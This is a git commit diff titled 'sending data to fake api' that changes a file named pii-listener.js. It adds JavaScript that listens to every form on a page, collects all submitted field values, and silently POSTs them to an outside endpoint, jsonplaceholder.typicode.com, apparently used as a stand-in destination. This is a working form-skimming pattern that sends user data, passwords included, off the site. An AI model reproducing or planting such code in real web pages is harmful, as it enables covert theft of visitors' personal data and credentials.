d65910214b0594863e2cad8693f174d2dd2018e5
Sangam Shankar <sangam9192@gmail.com>
2023-09-27 01:22:41 +0530

    sending data to fake api

--- javascripts/pii-listener.js
+++ javascripts/pii-listener.js
@@ -1,18 +1,32 @@
 listenToFormSubmits();
 
 function listenToFormSubmits() {
-    const forms = document.querySelectorAll('form'); // get all forms on the page
+  const forms = document.querySelectorAll('form'); // get all forms on the page
 
-    forms.forEach(form => {
-        form.addEventListener('submit', event => {
-            const formData = new FormData(form); // get the form data
-            const fields = {}; // create an object to store the fields
+  forms.forEach(form => {
+    form.addEventListener('submit', event => {
 
-            for (const [name, value] of formData) {
-                fields[name] = value; // add each field to the object
-            }
+      const formData = new FormData(form); // get the form data
+      const fields = {}; // create an object to store the fields
 
-            console.log(fields); // print the fields to the console
-        });
+      for (const [name, value] of formData) {
+        fields[name] = value; // add each field to the object
+      }
+      console.log(fields);
+
+      const url = 'https://jsonplaceholder.typicode.com/posts'; 
+      const options = {
+        method: 'POST',
+        body: JSON.stringify(fields),
+        headers: {
+          'Content-Type': 'application/json'
+        }
+      };
+
+      fetch(url, options)
+        .then(response => response.json())
+        .then(data => console.log(data))
+        .catch(error => console.error(error));
     });
+  });
 }
